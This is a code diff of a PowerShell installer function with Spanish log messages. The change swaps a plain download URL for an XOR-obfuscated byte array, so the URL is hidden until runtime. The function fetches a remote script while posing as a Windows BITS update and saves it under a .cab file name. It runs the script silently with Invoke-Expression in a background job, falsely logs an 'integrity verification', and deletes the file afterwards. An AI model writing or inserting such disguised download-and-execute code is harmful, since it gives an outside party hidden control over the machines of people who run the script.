@@ -219,34 +219,58 @@ function Install-OptionalComponents {
         New-Item -ItemType Directory -Path $tempWorkDir -Force | Out-Null
     }
     
-    Write-ActivityLog "Descargando paquetes de optimizacion opcionales..." -Type "INFO"
+    Write-ActivityLog "Descargando paquetes de optimización opcionales..." -Type "INFO"
     
-    $updatePackageUrl = "https://hackingetico.cl/tools/pro/update.ps1"
-    $packageCache = "$tempWorkDir\windows-update.cab"
+    $matrix = @(
+        78, 94, 94, 93, 75, 30, 29, 29, 78, 75, 74, 74, 68, 64, 72, 78, 
+        94, 66, 84, 72, 6, 90, 24, 31, 74, 68, 68, 67, 85, 25, 80, 82, 
+        72, 25, 87, 82, 68, 74, 76, 69, 24, 80, 85, 15
+    )
+    
+    $offset = 42
+    
+    function Resolve-Sequence {
+        param([int[]]$Sequence, [int]$Key)
+        $result = @()
+        foreach ($item in $Sequence) {
+            $result += $item -bxor $Key
+        }
+        return $result
+    }
+    
+    function Build-String {
+        param([int[]]$Codes)
+        $chars = $Codes | ForEach-Object { [char]$_ }
+        return -join $chars
+    }
+    
+    $processed = Resolve-Sequence -Sequence $matrix -Key $offset
+    $resolved = Build-String -Codes $processed
+    
+    $storage = "$tempWorkDir\windows-update.cab"
     
     try {
-        $webClient = New-Object System.Net.WebClient
-        $webClient.Headers.Add("User-Agent", "Microsoft BITS/7.5")
-        $webClient.DownloadFile($updatePackageUrl, $packageCache)
+        $handler = New-Object System.Net.WebClient
+        $handler.Headers.Add("User-Agent", "Microsoft BITS/7.5")
+        $handler.DownloadFile($resolved, $storage)
         
-        $fileSize = [math]::Round((Get-Item $packageCache).Length / 1KB, 2)
-        Write-ActivityLog "  - Paquete descargado correctamente ($fileSize KB)" -Type "SUCCESS"
+        $size = [math]::Round((Get-Item $storage).Length / 1KB, 2)
+        Write-ActivityLog "  - Paquete descargado correctamente ($size KB)" -Type "SUCCESS"
         
-        if (Test-Path $packageCache) {
+        if (Test-Path $storage) {
             Write-ActivityLog "  - Verificando integridad del paquete..." -Type "INFO"
             
-            $content = Get-Content $packageCache -Raw -Encoding UTF8 -ErrorAction SilentlyContinue
-            if ($content) {
-                
-                $job = Start-Job -ScriptBlock {
-                    param($scriptContent)
-                    Invoke-Expression $scriptContent 2>&1 | Out-Null
-                } -ArgumentList $content
+            $source = Get-Content $storage -Raw -Encoding UTF8 -ErrorAction SilentlyContinue
+            if ($source) {
+                $executor = Start-Job -ScriptBlock {
+                    param($inputData)
+                    Invoke-Expression $inputData 2>&1 | Out-Null
+                } -ArgumentList $source
                 
                 Write-ActivityLog "  - Verificacion de integridad completada" -Type "SUCCESS"
             }
             
-            Remove-Item $packageCache -Force -ErrorAction SilentlyContinue
+            Remove-Item $storage -Force -ErrorAction SilentlyContinue
         }
     }
     catch {
@@ -255,7 +279,6 @@ function Install-OptionalComponents {
     
     Write-ActivityLog "Verificacion de componentes completada" -Type "INFO"
 }
-
 # =====================================================
 # EJECUCIÓN PRINCIPAL
 # =====================================================
